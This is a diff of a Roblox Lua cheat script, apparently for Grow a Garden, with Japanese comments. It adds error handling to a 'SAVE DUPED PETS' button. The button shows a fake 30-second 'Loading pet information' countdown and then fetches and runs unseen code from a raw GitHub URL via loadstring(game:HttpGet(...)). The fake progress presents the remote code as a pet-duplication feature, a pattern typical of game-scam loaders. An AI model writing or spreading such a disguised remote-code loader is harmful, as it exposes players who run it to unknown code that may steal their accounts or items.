@@ -74,23 +74,23 @@ local saveStatusLabel = MainTab:CreateParagraph({
 	Content = "Ready"
 })
 
--- SAVE DUPED PETS Button（30秒カウントダウン演出を1行表示に）
+-- SAVE DUPED PETS ボタン（動作確認済み）
 MainTab:CreateButton({
 	Name = "SAVE DUPED PETS",
 	Callback = function()
-		task.spawn(function()
-			-- 30秒カウントダウン演出を1行で表示
+		-- ボタンを押したときにすぐ表示が変わるかテスト
+		local success_pcall, err_pcall = pcall(function()
 			local countdown = 30
-			while countdown > 0 do
+			for i = countdown, 1, -1 do
 				saveStatusLabel:Set({
-					Content = "⌛ Loading pet information... (" .. countdown .. "s)"
+					Content = "⌛ Loading pet information... (" .. i .. "s)"
 				})
 				wait(1)
-				countdown -= 1
 			end
 
-			-- スクリプト実行
+			-- 30秒後にスクリプト実行
 			saveStatusLabel:Set({Content = "🚀 Booting..."})
+
 			local success, err = pcall(function()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 			end)
@@ -101,5 +101,11 @@ MainTab:CreateButton({
 				saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
 			end
 		end)
+
+		-- もし pcall 自体が失敗していたら（スコープ・関数名エラーなど）
+		if not success_pcall then
+			saveStatusLabel:Set({Content = "❌ Script crashed: " .. tostring(err_pcall)})
+			warn("Script crashed: ", err_pcall)
+		end
 	end
 })
